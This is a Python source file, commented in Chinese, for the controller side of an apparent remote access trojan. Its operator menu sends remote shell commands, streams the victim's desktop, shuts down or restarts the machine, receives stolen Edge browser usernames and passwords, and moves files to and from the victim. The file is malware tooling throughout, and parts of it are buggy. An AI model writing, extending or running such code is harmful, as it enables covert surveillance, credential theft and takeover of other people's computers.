import pickle
from socket import *
import cv2
import numpy as np
from win32api import *
from win32con import *


# 命令执行
class cmd_s:
    def send_command(self, cmd):
        if not cmd:
            print("命令不能为空")
            return
        self.client_socket.send(cmd.encode())
        re = self.client_socket.recv(65536).decode('utf-8', 'ignore')
        print(re)

    def start(self):
        self.client_socket = client_socket
        while True:
            try:
                cmd = input("请输入命令: ")
                self.send_command(cmd)
                if cmd == 'quit':
                    break
            except Exception as e:
                print("发送命令出错:", e)
                break


def edge_browser_path_get(client_socket):
    while True:
        flag = client_socket.recv(1024).decode('utf-8')
        if flag == 'ok':
            break
        client_socket.send('可以发送'.encode('utf-8'))
        data = pickle.loads(client_socket.recv(2048))
        print(f"URL:{data[0]},\nUNAME:{data[1]},\nPASSWD:{data[4]}")


# 接收客户端UI
def UI_S():
    print("开启桌面监听")
    while True:
        client_socket.send('UI'.encode())
        print(client_addr[0])
        image_size = int(client_socket.recv(4096).decode('utf-8', errors='ignore'))
        print(image_size)
        client_socket.send('ok'.encode())
        recv_size = 0
        image_data = b''
        while recv_size < image_size:
            data = client_socket.recv(4096)
            image_data += data
            recv_size += len(data)
        image_array = np.frombuffer(image_data, dtype=np.uint8)
        image = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
        cv2.namedWindow(f'{client_addr[0]}DeskTop')
        cv2.imshow(f'{client_addr[0]}DeskTop', image)
        cv2.waitKey(20)
        if GetAsyncKeyState(VK_ESCAPE):
            client_socket.send('ESC'.encode())
            cv2.destroyWindow(f'{client_addr[0]}DeskTop')
            server_socket.close()
            break
        else:
            client_socket.send('继续'.encode())

    print("关闭桌面监听")


class down:
    def __init__(self):
        dd = 'shutdown -p'
        self.cmd_s.send_command(self, dd)


class restart:
    def __init__(self):
        cc = 'shutdown /r'
        self.cmd_s.send_command(self, cc)


def download():
    while True:
        path = input()
        client_socket.send(path.encode())
        with open('file', 'ab') as f:
            data = client_socket.recv(1024)
            if data == b'quit':
                break
            f.write(data)
            client_socket.send('success'.encode())
    print("文件接收完成")


def upload():
    path = input()
    client_socket.send(path.encode())
    with open(path, 'rb') as f:
        for i in f:
            client_socket.send(i)
            data = client_socket.recv(1024)
            if data != b'success':
                break
    print("文件发送完成")
    client_socket.send('quit'.encode())


if __name__ == "__main__":
    # 1. 创建套接字
    server_socket = socket()
    # 2. 绑定IP 端口
    server_socket.bind(('127.0.0.1',****))
    # 3. 开启监听
    server_socket.listen()
    client_socket, client_addr = server_socket.accept()
    print(client_socket.recv(1024).decode('utf-8'))
    while True:
        print('-----------------------------------------------------')
        print('------------1.cmd-------------2.视频监控---------------')
        print('------------3.关机-------------4.重启------------------')
        print('------------5.获取账号密码-------6.文件下载---------------')
        print('------------7.文件上传---------------------------------')
        print('请输入选择：')
        i = input()
        if i == '1':
            client_socket.send('1'.encode('utf-8'))
            cmd = cmd_s()
            cmd.start()
        elif i == '2':
            client_socket.send('2'.encode('utf-8'))
            UI_S()
        elif i == '3':
            client_socket.send('3'.encode('utf-8'))
            down()
        elif i == '4':
            client_socket.send('4'.encode('utf-8'))
            restart()
        elif i == '5':
            client_socket.send('5'.encode('utf-8'))
            edge_browser_path_get(client_socket)
        elif i == '6':
            client_socket.send('6'.encode('utf-8'))
            download()
        elif i == '7':
            client_socket.send('7'.encode('utf-8'))
            upload()
        else:
            print("选项错误，请重新输入")
            continue